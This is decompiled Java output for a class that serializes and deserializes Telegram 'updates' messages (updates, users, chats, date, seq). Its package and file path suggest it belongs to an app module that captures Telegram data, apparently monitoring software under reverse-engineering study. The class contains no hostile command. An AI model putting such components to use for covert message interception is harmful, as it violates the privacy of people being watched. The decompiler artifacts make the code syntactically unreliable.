package com.vvt.capture.telegram.internal;

import java.util.ArrayList;

public class TLRPC$TL_updates
  extends TLRPC.Updates
{
  public static int constructor = 1957577280;
  
  public void readParams(AbstractSerializedData paramAbstractSerializedData, boolean paramBoolean)
  {
    int i = 481674261;
    int j = 1;
    int k = 0;
    String str = null;
    int m = paramAbstractSerializedData.readInt32(paramBoolean);
    Object localObject1;
    Object localObject2;
    Integer localInteger;
    int n;
    int i1;
    Object localObject3;
    if (m != i)
    {
      if (paramBoolean)
      {
        localObject1 = new java/lang/RuntimeException;
        localObject2 = new Object[j];
        localInteger = Integer.valueOf(m);
        localObject2[0] = localInteger;
        str = String.format("wrong Vector magic, got %x", (Object[])localObject2);
        ((RuntimeException)localObject1).<init>(str);
        throw ((Throwable)localObject1);
      }
    }
    else
    {
      n = paramAbstractSerializedData.readInt32(paramBoolean);
      m = 0;
      localInteger = null;
      if (m >= n) {
        break label138;
      }
      i1 = paramAbstractSerializedData.readInt32(paramBoolean);
      localObject3 = TLRPC.Update.TLdeserialize(paramAbstractSerializedData, i1, paramBoolean);
      if (localObject3 != null) {
        break label115;
      }
    }
    for (;;)
    {
      return;
      label115:
      localObject2 = this.updates;
      ((ArrayList)localObject2).add(localObject3);
      m += 1;
      break;
      label138:
      m = paramAbstractSerializedData.readInt32(paramBoolean);
      if (m != i)
      {
        if (paramBoolean)
        {
          localObject1 = new java/lang/RuntimeException;
          localObject2 = new Object[j];
          localInteger = Integer.valueOf(m);
          localObject2[0] = localInteger;
          str = String.format("wrong Vector magic, got %x", (Object[])localObject2);
          ((RuntimeException)localObject1).<init>(str);
          throw ((Throwable)localObject1);
        }
      }
      else
      {
        n = paramAbstractSerializedData.readInt32(paramBoolean);
        m = 0;
        localInteger = null;
        for (;;)
        {
          if (m >= n) {
            break label263;
          }
          i1 = paramAbstractSerializedData.readInt32(paramBoolean);
          localObject3 = TLRPC.User.TLdeserialize(paramAbstractSerializedData, i1, paramBoolean);
          if (localObject3 == null) {
            break;
          }
          localObject2 = this.users;
          ((ArrayList)localObject2).add(localObject3);
          m += 1;
        }
        label263:
        m = paramAbstractSerializedData.readInt32(paramBoolean);
        if (m != i)
        {
          if (paramBoolean)
          {
            localObject1 = new java/lang/RuntimeException;
            localObject2 = new Object[j];
            localInteger = Integer.valueOf(m);
            localObject2[0] = localInteger;
            str = String.format("wrong Vector magic, got %x", (Object[])localObject2);
            ((RuntimeException)localObject1).<init>(str);
            throw ((Throwable)localObject1);
          }
        }
        else
        {
          m = paramAbstractSerializedData.readInt32(paramBoolean);
          for (;;)
          {
            if (k >= m) {
              break label382;
            }
            n = paramAbstractSerializedData.readInt32(paramBoolean);
            localObject1 = TLRPC.Chat.TLdeserialize(paramAbstractSerializedData, n, paramBoolean);
            if (localObject1 == null) {
              break;
            }
            localObject3 = this.chats;
            ((ArrayList)localObject3).add(localObject1);
            k += 1;
          }
          label382:
          k = paramAbstractSerializedData.readInt32(paramBoolean);
          this.date = k;
          k = paramAbstractSerializedData.readInt32(paramBoolean);
          this.seq = k;
        }
      }
    }
  }
  
  public void serializeToStream(AbstractSerializedData paramAbstractSerializedData)
  {
    int i = 481674261;
    int j = 0;
    int k = constructor;
    paramAbstractSerializedData.writeInt32(k);
    paramAbstractSerializedData.writeInt32(i);
    Object localObject = this.updates;
    int m = ((ArrayList)localObject).size();
    paramAbstractSerializedData.writeInt32(m);
    for (int n = 0; n < m; n = k)
    {
      localObject = (TLRPC.Update)this.updates.get(n);
      ((TLRPC.Update)localObject).serializeToStream(paramAbstractSerializedData);
      k = n + 1;
    }
    paramAbstractSerializedData.writeInt32(i);
    localObject = this.users;
    m = ((ArrayList)localObject).size();
    paramAbstractSerializedData.writeInt32(m);
    for (n = 0; n < m; n = k)
    {
      localObject = (TLRPC.User)this.users.get(n);
      ((TLRPC.User)localObject).serializeToStream(paramAbstractSerializedData);
      k = n + 1;
    }
    paramAbstractSerializedData.writeInt32(i);
    localObject = this.chats;
    n = ((ArrayList)localObject).size();
    paramAbstractSerializedData.writeInt32(n);
    while (j < n)
    {
      localObject = (TLRPC.Chat)this.chats.get(j);
      ((TLRPC.Chat)localObject).serializeToStream(paramAbstractSerializedData);
      k = j + 1;
      j = k;
    }
    k = this.date;
    paramAbstractSerializedData.writeInt32(k);
    k = this.seq;
    paramAbstractSerializedData.writeInt32(k);
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/capture/telegram/internal/TLRPC$TL_updates.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */